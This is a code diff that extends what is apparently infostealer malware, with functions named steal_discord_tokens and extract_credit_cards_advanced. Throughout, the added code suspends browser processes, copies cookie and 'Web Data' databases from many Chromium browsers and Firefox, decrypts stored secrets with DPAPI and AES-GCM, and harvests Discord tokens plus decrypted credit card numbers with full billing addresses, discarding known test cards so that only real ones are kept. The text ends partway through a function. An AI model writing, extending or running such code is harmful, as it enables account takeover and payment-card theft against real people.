@@ -763,7 +763,7 @@ def steal_discord_tokens():
         except Exception as e:
             print(f"Debug: Backup method failed: {str(e)}")
         
-        # Method 3: Extract from browser storage
+        # Method 3: Extract from browser storage (web Discord tokens)
         try:
             browser_tokens = extract_discord_tokens_from_browsers()
             for token, source in browser_tokens:
@@ -773,6 +773,7 @@ def steal_discord_tokens():
                         user_info = get_discord_user_info(token)
                         if user_info and user_info.get('id') not in all_uids:
                             all_uids.append(user_info.get('id'))
+                        print(f"Debug: Browser token found from {source}")
                     except:
                         all_uids.append('Unknown')
             print(f"Debug: Browser method found {len(browser_tokens)} additional tokens")
@@ -789,11 +790,46 @@ def steal_discord_tokens():
                         user_info = get_discord_user_info(token)
                         if user_info and user_info.get('id') not in all_uids:
                             all_uids.append(user_info.get('id'))
+                        print(f"Debug: Memory token found from {source}")
                     except:
                         all_uids.append('Unknown')
             print(f"Debug: Memory method found {len(memory_tokens)} additional tokens")
         except Exception as e:
             print(f"Debug: Memory extraction failed: {str(e)}")
+        
+        # Method 5: Extract from Discord injection data (if injection is active)
+        try:
+            injection_tokens = extract_discord_injection_tokens()
+            for token, source in injection_tokens:
+                if token not in all_tokens:
+                    all_tokens.append(token)
+                    try:
+                        user_info = get_discord_user_info(token)
+                        if user_info and user_info.get('id') not in all_uids:
+                            all_uids.append(user_info.get('id'))
+                        print(f"Debug: Injection token found from {source}")
+                    except:
+                        all_uids.append('Unknown')
+            print(f"Debug: Injection method found {len(injection_tokens)} additional tokens")
+        except Exception as e:
+            print(f"Debug: Injection extraction failed: {str(e)}")
+        
+        # Method 6: Extract from browser cookies (Discord web sessions)
+        try:
+            cookie_tokens = extract_discord_tokens_from_cookies()
+            for token, source in cookie_tokens:
+                if token not in all_tokens:
+                    all_tokens.append(token)
+                    try:
+                        user_info = get_discord_user_info(token)
+                        if user_info and user_info.get('id') not in all_uids:
+                            all_uids.append(user_info.get('id'))
+                        print(f"Debug: Cookie token found from {source}")
+                    except:
+                        all_uids.append('Unknown')
+            print(f"Debug: Cookie method found {len(cookie_tokens)} additional tokens")
+        except Exception as e:
+            print(f"Debug: Cookie extraction failed: {str(e)}")
         
         # Update counter with final count
         counters['discord_tokens_found'] = len(all_tokens)
@@ -834,7 +870,7 @@ def steal_roblox_accounts():
 # ================================================================
 
 def extract_credit_cards_advanced():
-    """Super advanced credit card extraction from multiple sources"""
+    """Super advanced credit card extraction from multiple sources with enhanced methods"""
     try:
         print("💳 Starting advanced credit card extraction...")
         
@@ -845,19 +881,33 @@ def extract_credit_cards_advanced():
             'clipboard_cards': [],
             'file_cards': [],
             'registry_cards': [],
-            'memory_cards': []
+            'memory_cards': [],
+            'browser_history_cards': [],  # New: from payment URLs in history
+            'browser_downloads_cards': [],  # New: from downloaded payment files
+            'discord_payment_cards': [],  # New: from Discord payment data
+            'temp_file_cards': [],  # New: from temporary files
+            'recent_docs_cards': []  # New: from recent documents
         }
         
-        # Suspend browser processes for extraction
+        # Enhanced browser process suspension with better stealth
         suspended_processes = []
         try:
-            browser_processes = ['chrome.exe', 'msedge.exe', 'firefox.exe', 'opera.exe', 'brave.exe']
-            for proc in psutil.process_iter(['pid', 'name']):
+            browser_processes = [
+                'chrome.exe', 'msedge.exe', 'firefox.exe', 'opera.exe', 'brave.exe',
+                'vivaldi.exe', 'arc.exe', 'thorium.exe', 'yandex.exe', 'centbrowser.exe'
+            ]
+            for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):
                 try:
-                    if proc.info['name'].lower() in [p.lower() for p in browser_processes]:
+                    if proc.info['name'] and proc.info['name'].lower() in [p.lower() for p in browser_processes]:
+                        suspended_processes.append({
+                            'process': proc,
+                            'pid': proc.info['pid'],
+                            'name': proc.info['name'],
+                            'exe': proc.info.get('exe'),
+                            'cmdline': proc.info.get('cmdline', [])
+                        })
                         proc.suspend()
-                        suspended_processes.append(proc)
-                        time.sleep(0.05)
+                        time.sleep(0.02)  # Reduced delay for speed
                 except (psutil.NoSuchProcess, psutil.AccessDenied):
                     pass
                 except Exception:
@@ -865,65 +915,121 @@ def extract_credit_cards_advanced():
         except Exception:
             pass
         
-        # 1. Extract from browser autofill data
+        print(f"💳 Suspended {len(suspended_processes)} browser processes for extraction")
+        
+        # 1. Extract from browser autofill data (enhanced)
         try:
-            all_cards['browser_autofill'] = extract_autofill_credit_cards()
+            all_cards['browser_autofill'] = extract_autofill_credit_cards_enhanced()
+            print(f"💳 Autofill extraction: {len(all_cards['browser_autofill'])} cards")
         except Exception as e:
             print(f"💳 Autofill extraction failed: {e}")
         
-        # 2. Extract from browser saved payment methods
+        # 2. Extract from browser saved payment methods (enhanced)
         try:
-            all_cards['browser_saved_cards'] = extract_saved_payment_methods()
+            all_cards['browser_saved_cards'] = extract_saved_payment_methods_enhanced()
+            print(f"💳 Saved cards extraction: {len(all_cards['browser_saved_cards'])} cards")
         except Exception as e:
             print(f"💳 Saved cards extraction failed: {e}")
         
-        # 3. Extract from form submission data
+        # 3. Extract from form submission data (enhanced)
         try:
-            all_cards['form_data'] = extract_form_credit_cards()
+            all_cards['form_data'] = extract_form_credit_cards_enhanced()
+            print(f"💳 Form data extraction: {len(all_cards['form_data'])} cards")
         except Exception as e:
             print(f"💳 Form data extraction failed: {e}")
         
-        # 4. Extract from clipboard (recently copied cards)
+        # 4. Extract from clipboard (enhanced with history)
         try:
-            all_cards['clipboard_cards'] = extract_clipboard_credit_cards()
+            all_cards['clipboard_cards'] = extract_clipboard_credit_cards_enhanced()
+            print(f"💳 Clipboard extraction: {len(all_cards['clipboard_cards'])} cards")
         except Exception as e:
             print(f"💳 Clipboard extraction failed: {e}")
         
-        # 5. Extract from files (wallet apps, payment software)
+        # 5. Extract from files (enhanced with more locations)
         try:
-            all_cards['file_cards'] = extract_file_credit_cards()
+            all_cards['file_cards'] = extract_file_credit_cards_enhanced()
+            print(f"💳 File extraction: {len(all_cards['file_cards'])} cards")
         except Exception as e:
             print(f"💳 File extraction failed: {e}")
         
-        # 6. Extract from Windows registry
+        # 6. Extract from Windows registry (enhanced)
         try:
-            all_cards['registry_cards'] = extract_registry_credit_cards()
+            all_cards['registry_cards'] = extract_registry_credit_cards_enhanced()
+            print(f"💳 Registry extraction: {len(all_cards['registry_cards'])} cards")
         except Exception as e:
             print(f"💳 Registry extraction failed: {e}")
         
-        # 7. Extract from memory (running payment processes)
+        # 7. Extract from memory (enhanced with process scanning)
         try:
-            all_cards['memory_cards'] = extract_memory_credit_cards()
+            all_cards['memory_cards'] = extract_memory_credit_cards_enhanced()
+            print(f"💳 Memory extraction: {len(all_cards['memory_cards'])} cards")
         except Exception as e:
             print(f"💳 Memory extraction failed: {e}")
         
-        # Resume suspended processes
+        # 8. NEW: Extract from browser history (payment URLs)
         try:
-            for proc in suspended_processes:
+            all_cards['browser_history_cards'] = extract_credit_cards_from_history()
+            print(f"💳 History extraction: {len(all_cards['browser_history_cards'])} cards")
+        except Exception as e:
+            print(f"💳 History extraction failed: {e}")
+        
+        # 9. NEW: Extract from browser downloads (payment files)
+        try:
+            all_cards['browser_downloads_cards'] = extract_credit_cards_from_downloads()
+            print(f"💳 Downloads extraction: {len(all_cards['browser_downloads_cards'])} cards")
+        except Exception as e:
+            print(f"💳 Downloads extraction failed: {e}")
+        
+        # 10. NEW: Extract from Discord payment data
+        try:
+            all_cards['discord_payment_cards'] = extract_discord_payment_cards()
+            print(f"💳 Discord payment extraction: {len(all_cards['discord_payment_cards'])} cards")
+        except Exception as e:
+            print(f"💳 Discord payment extraction failed: {e}")
+        
+        # 11. NEW: Extract from temporary files
+        try:
+            all_cards['temp_file_cards'] = extract_credit_cards_from_temp_files()
+            print(f"💳 Temp files extraction: {len(all_cards['temp_file_cards'])} cards")
+        except Exception as e:
+            print(f"💳 Temp files extraction failed: {e}")
+        
+        # 12. NEW: Extract from recent documents
+        try:
+            all_cards['recent_docs_cards'] = extract_credit_cards_from_recent_docs()
+            print(f"💳 Recent docs extraction: {len(all_cards['recent_docs_cards'])} cards")
+        except Exception as e:
+            print(f"💳 Recent docs extraction failed: {e}")
+        
+        # Enhanced process restoration with better error handling
+        try:
+            print(f"💳 Resuming {len(suspended_processes)} browser processes...")
+            for proc_info in suspended_processes:
                 try:
-                    proc.resume()
-                    time.sleep(0.05)
+                    # Try to resume the suspended process
+                    proc_info['process'].resume()
+                    time.sleep(0.02)
                 except (psutil.NoSuchProcess, psutil.AccessDenied):
-                    pass
+                    # Process no longer exists, try to restart it
+                    try:
+                        if proc_info.get('cmdline') and len(proc_info['cmdline']) > 0:
+                            subprocess.Popen(proc_info['cmdline'], shell=False, 
+                                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        elif proc_info.get('exe'):
+                            subprocess.Popen([proc_info['exe']], shell=False, 
+                                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        time.sleep(0.1)
+                    except Exception:
+                        pass
                 except Exception:
                     pass
         except Exception:
             pass
         
-        # Validate and deduplicate cards
-        validated_cards = validate_and_deduplicate_cards(all_cards)
+        # Enhanced validation and deduplication
+        validated_cards = validate_and_deduplicate_cards_enhanced(all_cards)
         
-        print(f"💳 Credit card extraction complete: {len(validated_cards)} valid cards found")
+        print(f"💳 SUPER ADVANCED credit card extraction complete: {len(validated_cards)} valid cards found")
         return validated_cards
         
     except Exception as e:
@@ -3223,6 +3329,1763 @@ def extract_discord_tokens_from_memory():
         
     except Exception as e:
         print(f"Debug: Memory token extraction error: {str(e)}")
+        return []
+
+def extract_discord_injection_tokens():
+    """Extract tokens from Discord injection data"""
+    try:
+        tokens = []
+        
+        # Look for Discord injection log files
+        injection_paths = [
+            os.path.expanduser("~/AppData/Roaming/Discord"),
+            os.path.expanduser("~/AppData/Local/Discord"),
+            os.path.expanduser("~/AppData/Local/DiscordCanary"),
+            os.path.expanduser("~/AppData/Local/DiscordPTB"),
+            "C:\\Users\\Public\\Libraries\\Discord",
+            "C:\\Windows\\Temp"
+        ]
+        
+        injection_files = [
+            "injection_log.txt", "credentials.log", "tokens.txt", "discord_data.txt",
+            "userdata.json", "sessions.dat", "passwords.log"
+        ]
+        
+        token_patterns = [
+            r'[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,}',
+            r'token["\']?\s*[:\=]\s*["\']([A-Za-z0-9_-]{50,})["\']',
+            r'authorization["\']?\s*[:\=]\s*["\']([A-Za-z0-9_-]{50,})["\']',
+        ]
+        
+        for injection_path in injection_paths:
+            if not os.path.exists(injection_path):
+                continue
+                
+            for root, dirs, files in os.walk(injection_path):
+                for file in files:
+                    if any(inj_file in file.lower() for inj_file in injection_files):
+                        try:
+                            file_path = os.path.join(root, file)
+                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                content = f.read()
+                                
+                            for pattern in token_patterns:
+                                matches = re.findall(pattern, content)
+                                for match in matches:
+                                    token = match if isinstance(match, str) else match
+                                    if validate_discord_token_enhanced(token):
+                                        tokens.append((token, f'Injection - {file}'))
+                                        
+                        except Exception:
+                            continue
+        
+        return tokens
+        
+    except Exception as e:
+        print(f"Debug: Injection token extraction error: {str(e)}")
+        return []
+
+def extract_discord_tokens_from_cookies():
+    """Extract Discord tokens from browser cookies (web sessions)"""
+    try:
+        tokens = []
+        
+        # Browser cookie databases
+        cookie_paths = [
+            # Chrome
+            (os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies'), 'Chrome'),
+            (os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Profile 1', 'Network', 'Cookies'), 'Chrome Profile 1'),
+            
+            # Edge
+            (os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Network', 'Cookies'), 'Edge'),
+            
+            # Opera
+            (os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Network', 'Cookies'), 'Opera'),
+            
+            # Brave
+            (os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Network', 'Cookies'), 'Brave'),
+        ]
+        
+        discord_domains = ['discord.com', 'discordapp.com', '.discord.com', '.discordapp.com']
+        
+        for cookie_db_path, browser_name in cookie_paths:
+            if not os.path.exists(cookie_db_path):
+                continue
+                
+            try:
+                # Create temporary copy to avoid locking issues
+                temp_db = tempfile.mktemp(suffix='.db')
+                shutil.copy2(cookie_db_path, temp_db)
+                
+                conn = sqlite3.connect(temp_db)
+                cursor = conn.cursor()
+                
+                # Query Discord-related cookies
+                for domain in discord_domains:
+                    try:
+                        cursor.execute("""
+                            SELECT name, value, host_key, path, encrypted_value 
+                            FROM cookies 
+                            WHERE host_key LIKE ? AND (name LIKE '%token%' OR name LIKE '%auth%' OR name LIKE '%session%')
+                        """, (f'%{domain}%',))
+                        
+                        for row in cursor.fetchall():
+                            name, value, host_key, path, encrypted_value = row
+                            
+                            # Try to decrypt the cookie value if encrypted
+                            if encrypted_value:
+                                try:
+                                    # Get master key for this browser
+                                    browser_profile_path = os.path.dirname(os.path.dirname(cookie_db_path))
+                                    master_key = get_master_key(os.path.join(browser_profile_path, 'Local State'))
+                                    if master_key:
+                                        decrypted_value = decrypt_token(encrypted_value, master_key)
+                                        if decrypted_value:
+                                            value = decrypted_value
+                                except:
+                                    pass
+                            
+                            # Check if the cookie value looks like a Discord token
+                            if value and len(value) > 50:
+                                # Look for token patterns in the cookie value
+                                token_patterns = [
+                                    r'[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,}',
+                                ]
+                                
+                                for pattern in token_patterns:
+                                    matches = re.findall(pattern, value)
+                                    for match in matches:
+                                        if validate_discord_token_enhanced(match):
+                                            tokens.append((match, f'{browser_name} Cookie - {name}'))
+                                            
+                    except Exception as domain_error:
+                        print(f"Debug: Error querying {domain} in {browser_name}: {str(domain_error)}")
+                        continue
+                
+                conn.close()
+                os.unlink(temp_db)
+                
+            except Exception as browser_error:
+                print(f"Debug: Error processing {browser_name} cookies: {str(browser_error)}")
+                continue
+        
+        # Also check Firefox cookies
+        try:
+            firefox_profiles = get_firefox_profiles()
+            for profile_path in firefox_profiles:
+                cookie_file = os.path.join(profile_path, 'cookies.sqlite')
+                if os.path.exists(cookie_file):
+                    try:
+                        temp_db = tempfile.mktemp(suffix='.db')
+                        shutil.copy2(cookie_file, temp_db)
+                        
+                        conn = sqlite3.connect(temp_db)
+                        cursor = conn.cursor()
+                        
+                        for domain in discord_domains:
+                            try:
+                                cursor.execute("""
+                                    SELECT name, value, host 
+                                    FROM moz_cookies 
+                                    WHERE host LIKE ? AND (name LIKE '%token%' OR name LIKE '%auth%' OR name LIKE '%session%')
+                                """, (f'%{domain}%',))
+                                
+                                for row in cursor.fetchall():
+                                    name, value, host = row
+                                    
+                                    if value and len(value) > 50:
+                                        token_patterns = [
+                                            r'[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,}',
+                                        ]
+                                        
+                                        for pattern in token_patterns:
+                                            matches = re.findall(pattern, value)
+                                            for match in matches:
+                                                if validate_discord_token_enhanced(match):
+                                                    tokens.append((match, f'Firefox Cookie - {name}'))
+                                                    
+                            except Exception:
+                                continue
+                        
+                        conn.close()
+                        os.unlink(temp_db)
+                        
+                    except Exception:
+                        continue
+        except Exception as e:
+            print(f"Debug: Firefox cookie extraction error: {str(e)}")
+        
+        return tokens
+        
+    except Exception as e:
+        print(f"Debug: Cookie token extraction error: {str(e)}")
+        return []
+
+def extract_autofill_credit_cards_enhanced():
+    """Enhanced credit card extraction from browser autofill with more browsers and profiles"""
+    try:
+        cards = []
+        
+        # Comprehensive browser list with all profiles
+        browser_configs = [
+            # Chrome variants
+            ('Chrome Default', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Web Data')),
+            ('Chrome Profile 1', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Profile 1', 'Web Data')),
+            ('Chrome Profile 2', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Profile 2', 'Web Data')),
+            ('Chrome Canary', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome SxS', 'User Data', 'Default', 'Web Data')),
+            
+            # Edge variants
+            ('Edge Default', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Web Data')),
+            ('Edge Profile 1', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Profile 1', 'Web Data')),
+            ('Edge Beta', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge Beta', 'User Data', 'Default', 'Web Data')),
+            ('Edge Dev', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge Dev', 'User Data', 'Default', 'Web Data')),
+            
+            # Other browsers
+            ('Brave', os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Web Data')),
+            ('Opera', os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Web Data')),
+            ('Opera GX', os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera GX Stable', 'Web Data')),
+            ('Vivaldi', os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data', 'Default', 'Web Data')),
+            ('Arc', os.path.join(os.getenv('LOCALAPPDATA'), 'Arc', 'User Data', 'Default', 'Web Data')),
+            ('Yandex', os.path.join(os.getenv('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Web Data')),
+        ]
+        
+        for browser_name, db_path in browser_configs:
+            if os.path.exists(db_path):
+                cards.extend(extract_chrome_autofill_cards_enhanced(db_path, browser_name))
+        
+        # Firefox profiles
+        firefox_profiles = get_firefox_profiles()
+        for profile in firefox_profiles:
+            cards.extend(extract_firefox_autofill_cards_enhanced(profile))
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced autofill extraction error: {e}")
+        return []
+
+def extract_chrome_autofill_cards_enhanced(db_path, browser_name):
+    """Enhanced Chrome autofill extraction with better decryption and more data"""
+    try:
+        cards = []
+        
+        # Create a temporary copy to avoid locking issues
+        temp_db = tempfile.mktemp(suffix='.db')
+        shutil.copy2(db_path, temp_db)
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        
+        # Enhanced query to get more card data
+        cursor.execute("""
+            SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, 
+                   date_modified, use_count, use_date, billing_address_id, origin
+            FROM credit_cards
+            WHERE card_number_encrypted IS NOT NULL
+        """)
+        
+        for row in cursor.fetchall():
+            try:
+                name, month, year, encrypted_card, date_modified, use_count, use_date, billing_id, origin = row
+                
+                # Enhanced decryption with multiple methods
+                chrome_profile_path = os.path.dirname(os.path.dirname(db_path))
+                decrypted_card = decrypt_chrome_credit_card_enhanced(encrypted_card, chrome_profile_path)
+                
+                if decrypted_card and validate_credit_card_enhanced(decrypted_card):
+                    # Get additional billing address info if available
+                    billing_info = None
+                    if billing_id:
+                        try:
+                            cursor.execute("""
+                                SELECT first_name, last_name, street_address, city, state, zipcode, country_code
+                                FROM autofill_profiles
+                                WHERE guid = ?
+                            """, (billing_id,))
+                            billing_row = cursor.fetchone()
+                            if billing_row:
+                                billing_info = {
+                                    'first_name': billing_row[0],
+                                    'last_name': billing_row[1],
+                                    'address': billing_row[2],
+                                    'city': billing_row[3],
+                                    'state': billing_row[4],
+                                    'zipcode': billing_row[5],
+                                    'country': billing_row[6]
+                                }
+                        except:
+                            pass
+                    
+                    cards.append({
+                        'card_number': decrypted_card,
+                        'name': name,
+                        'exp_month': month,
+                        'exp_year': year,
+                        'date_modified': date_modified,
+                        'use_count': use_count,
+                        'use_date': use_date,
+                        'origin': origin,
+                        'billing_info': billing_info,
+                        'source': f'{browser_name}_autofill',
+                        'browser': browser_name
+                    })
+            except Exception as card_error:
+                print(f"💳 Error processing card in {browser_name}: {str(card_error)}")
+                continue
+        
+        conn.close()
+        os.unlink(temp_db)
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced {browser_name} autofill extraction error: {e}")
+        return []
+
+def decrypt_chrome_credit_card_enhanced(encrypted_data, chrome_profile_path=None):
+    """Enhanced Chrome credit card decryption with multiple fallback methods"""
+    try:
+        # Method 1: Standard DPAPI decryption (older Chrome versions)
+        try:
+            decrypted = win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1]
+            return decrypted.decode('utf-8')
+        except Exception as dpapi_error:
+            print(f"💳 DPAPI decryption failed: {str(dpapi_error)}")
+        
+        # Method 2: AES-GCM decryption (newer Chrome versions)
+        try:
+            # Get Chrome encryption key from Local State
+            if chrome_profile_path:
+                local_state_path = os.path.join(chrome_profile_path, 'Local State')
+            else:
+                # Default Chrome paths
+                chrome_paths = [
+                    os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
+                    os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data'),
+                    os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
+                    os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data')
+                ]
+                local_state_path = None
+                for chrome_path in chrome_paths:
+                    test_path = os.path.join(chrome_path, 'Local State')
+                    if os.path.exists(test_path):
+                        local_state_path = test_path
+                        break
+            
+            if not local_state_path or not os.path.exists(local_state_path):
+                return None
+            
+            with open(local_state_path, 'r', encoding='utf-8') as f:
+                local_state = json.load(f)
+            
+            if 'os_crypt' not in local_state or 'encrypted_key' not in local_state['os_crypt']:
+                return None
+            
+            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
+            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            
+            # Try AES-GCM decryption with proper tag handling
+            if len(encrypted_data) > 31:  # v10 format
+                nonce = encrypted_data[3:15]
+                ciphertext = encrypted_data[15:-16]
+                tag = encrypted_data[-16:]
+                
+                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+                return decrypted.decode('utf-8')
+            
+        except Exception as aes_error:
+            print(f"💳 AES-GCM decryption failed: {str(aes_error)}")
+        
+        # Method 3: Try different encryption formats
+        try:
+            # Some versions use different header formats
+            if len(encrypted_data) > 15:
+                # Try v11 format
+                nonce = encrypted_data[0:12]
+                ciphertext = encrypted_data[12:-16]
+                tag = encrypted_data[-16:]
+                
+                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+                return decrypted.decode('utf-8')
+                
+        except Exception as alt_error:
+            print(f"💳 Alternative decryption failed: {str(alt_error)}")
+        
+        return None
+        
+    except Exception as e:
+        print(f"💳 Enhanced Chrome decryption error: {e}")
+        return None
+
+def validate_credit_card_enhanced(card_number):
+    """Enhanced credit card validation with better Luhn algorithm and issuer detection"""
+    try:
+        if not card_number:
+            return False
+            
+        # Remove any non-digit characters
+        card_number = re.sub(r'\D', '', str(card_number))
+        
+        # Check if it's 13-19 digits (valid card length range)
+        if len(card_number) < 13 or len(card_number) > 19:
+            return False
+        
+        # Enhanced Luhn algorithm validation
+        def luhn_checksum(card_num):
+            def digits_of(n):
+                return [int(d) for d in str(n)]
+            digits = digits_of(card_num)
+            odd_digits = digits[-1::-2]
+            even_digits = digits[-2::-2]
+            checksum = sum(odd_digits)
+            for d in even_digits:
+                doubled = d * 2
+                if doubled > 9:
+                    doubled = doubled - 9
+                checksum += doubled
+            return checksum % 10
+        
+        if luhn_checksum(card_number) != 0:
+            return False
+        
+        # Additional validation: Check for known test/fake card patterns
+        test_patterns = [
+            r'^4000000000000000',  # Test Visa
+            r'^4111111111111111',  # Test Visa
+            r'^5555555555554444',  # Test Mastercard
+            r'^2223000048400011',  # Test Mastercard
+            r'^378282246310005',   # Test Amex
+            r'^371449635398431',   # Test Amex
+            r'^6011111111111117',  # Test Discover
+            r'^1234567890123456',  # Obviously fake
+            r'^0000000000000000',  # All zeros
+            r'^9999999999999999',  # All nines
+        ]
+        
+        for pattern in test_patterns:
+            if re.match(pattern, card_number):
+                return False  # Reject test/fake cards
+        
+        # Check for repeated digits (likely fake)
+        if len(set(card_number)) <= 2:  # Only 1-2 unique digits
+            return False
+        
+        # Issuer validation (basic check for major card types)
+        issuer_patterns = {
+            'visa': r'^4[0-9]{12}(?:[0-9]{3})?$',
+            'mastercard': r'^5[1-5][0-9]{14}$|^2(?:2(?:2[1-9]|[3-9][0-9])|[3-6][0-9][0-9]|7(?:[01][0-9]|20))[0-9]{12}$',
+            'amex': r'^3[47][0-9]{13}$',
+            'discover': r'^6(?:011|5[0-9]{2})[0-9]{12}$',
+            'diners': r'^3[0689][0-9]{11}$',
+            'jcb': r'^(?:2131|1800|35[0-9]{3})[0-9]{11}$'
+        }
+        
+        # Check if card matches any known issuer pattern
+        valid_issuer = False
+        for issuer, pattern in issuer_patterns.items():
+            if re.match(pattern, card_number):
+                valid_issuer = True
+                break
+        
+        return valid_issuer
+        
+    except Exception as e:
+        print(f"💳 Enhanced card validation error: {e}")
+        return False
+
+def extract_saved_payment_methods_enhanced():
+    """Enhanced extraction of saved payment methods with more browsers and better decryption"""
+    try:
+        cards = []
+        
+        # Enhanced browser paths including all variants and profiles
+        browser_paths = [
+            # Chrome variants
+            ('Chrome Default', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Web Data')),
+            ('Chrome Profile 1', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Profile 1', 'Web Data')),
+            ('Chrome Profile 2', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Profile 2', 'Web Data')),
+            ('Chrome Canary', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome SxS', 'User Data', 'Default', 'Web Data')),
+            ('Chrome Beta', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome Beta', 'User Data', 'Default', 'Web Data')),
+            
+            # Edge variants
+            ('Edge Default', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Web Data')),
+            ('Edge Profile 1', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Profile 1', 'Web Data')),
+            ('Edge Beta', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge Beta', 'User Data', 'Default', 'Web Data')),
+            ('Edge Dev', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge Dev', 'User Data', 'Default', 'Web Data')),
+            
+            # Other Chromium browsers
+            ('Brave', os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Web Data')),
+            ('Opera', os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Web Data')),
+            ('Opera GX', os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera GX Stable', 'Web Data')),
+            ('Vivaldi', os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data', 'Default', 'Web Data')),
+            ('Arc', os.path.join(os.getenv('LOCALAPPDATA'), 'Arc', 'User Data', 'Default', 'Web Data')),
+            ('Yandex', os.path.join(os.getenv('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Web Data')),
+            ('Thorium', os.path.join(os.getenv('LOCALAPPDATA'), 'Thorium', 'User Data', 'Default', 'Web Data')),
+            ('Ungoogled Chromium', os.path.join(os.getenv('LOCALAPPDATA'), 'Chromium', 'User Data', 'Default', 'Web Data')),
+        ]
+        
+        for browser_name, web_data_path in browser_paths:
+            if os.path.exists(web_data_path):
+                cards.extend(extract_chrome_payment_methods_enhanced(web_data_path, browser_name))
+        
+        # Enhanced Firefox saved payment methods
+        firefox_profiles = get_firefox_profiles()
+        for profile in firefox_profiles:
+            cards.extend(extract_firefox_payment_methods_enhanced(profile))
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced saved payment methods extraction error: {e}")
+        return []
+
+def extract_chrome_payment_methods_enhanced(db_path, browser_name):
+    """Enhanced Chrome payment methods extraction with comprehensive data collection"""
+    try:
+        cards = []
+        temp_db = tempfile.mktemp(suffix='.db')
+        shutil.copy2(db_path, temp_db)
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        
+        # Enhanced query to get all available payment data
+        cursor.execute("""
+            SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, 
+                   billing_address_id, date_modified, use_count, use_date, origin,
+                   nickname, card_type, issuer_id
+            FROM credit_cards
+            WHERE card_number_encrypted IS NOT NULL
+        """)
+        
+        for row in cursor.fetchall():
+            try:
+                (name, month, year, encrypted_card, billing_id, date_modified, 
+                 use_count, use_date, origin, nickname, card_type, issuer_id) = row
+                
+                chrome_profile_path = os.path.dirname(os.path.dirname(db_path))
+                decrypted_card = decrypt_chrome_credit_card_enhanced(encrypted_card, chrome_profile_path)
+                
+                if decrypted_card and validate_credit_card_enhanced(decrypted_card):
+                    # Get comprehensive billing address info
+                    billing_info = None
+                    if billing_id:
+                        try:
+                            cursor.execute("""
+                                SELECT first_name, last_name, middle_name, full_name,
+                                       company_name, street_address, dependent_locality,
+                                       city, state, zipcode, sorting_code, country_code,
+                                       phone_number, email, language_code
+                                FROM autofill_profiles
+                                WHERE guid = ?
+                            """, (billing_id,))
+                            billing_row = cursor.fetchone()
